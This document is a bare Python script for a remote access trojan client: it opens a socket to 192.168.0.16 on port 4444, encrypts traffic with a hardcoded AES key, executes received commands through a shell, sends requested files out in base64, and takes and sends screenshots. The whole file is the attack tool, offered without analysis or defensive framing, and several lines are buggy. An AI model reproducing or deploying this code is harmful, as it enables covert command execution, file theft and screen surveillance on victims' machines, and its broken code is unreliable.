#!/usr/bin/python

import os 
import socket
import subprocess
import json
import base64
import pyautogui
from Crypto.Cipher import AES

counter = 5432141252624321
key = 12345678901234567890123456789012


def encrypt(message):
	encrypto = AES.new(key,AES.MODE_CTR, counter=lambda: counter)
	return encrypto.encrypt(message)
def decrypt(message):
	decrypto = AES.new(key,AES.MODE_CTR,counter=lambda: counter)
	return decrypto.decrypt(message)


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.16",4444))
s.send(encrypt("Connection made"))
while True:
	command = decrypt(s.recv(1024))
	command_json_decoded = json.loads(command)
	if "download" in command_json_decoded:
		command_split = command.split(" ")
		file = command_split[1]
		file_data = open(str(file,"rb"))
		file_data_base64 = base64.b64encode(bytes(file_data.read(),"utf-8"))
		file_data_base64_json = json.dumps(file_data_base64)
		s.sendall(encrypt(file_data_base64_json))
		file.close()
	if "screencapture" in command_json_decoded:
		pic = pyautogui.screenshot()
		pic.save("Screenshot.png")
		file = open("Screenshot.png","rb")
		picture = json.dump(base64.b64encode(file.read()))
		file.close()
		s.sendall(encrypt(picture))	
	result = subprocess.check_output(command_json_decoded,shell=True)
	result_json_encoded = json.dumps(result)
	s.sendall(encrypt(result_json_encoded))
	
	

